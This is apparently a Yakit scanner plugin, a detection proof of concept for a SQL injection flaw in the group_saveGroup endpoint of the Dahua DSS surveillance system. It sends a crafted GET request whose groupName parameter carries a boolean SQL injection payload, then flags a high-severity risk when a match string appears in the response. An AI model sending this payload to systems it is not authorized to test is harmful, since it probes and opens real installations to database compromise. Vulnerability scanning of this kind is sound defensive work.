# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /emap/group_saveGroup?groupName=1%27%20and%20md5(1)=%27c4ca4238a0b923820dcc509a6f75849b%27%20and%20%271%27=%271&groupDesc=1 HTTP/1.1
Host:{{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

`

    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(10),
    )

    //dump(rsp)
        if str.MatchAllOfSubString(rsp,'HTTP/1.1 200','预案名称已存在'){
        yakit.Info("%v found 大华 DSS 数字监控系统group_saveGroup存在SQL注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("大华 DSS 数字监控系统group_saveGroup存在SQL注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("大华 DSS 数字监控系统group_saveGroup存在SQL注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
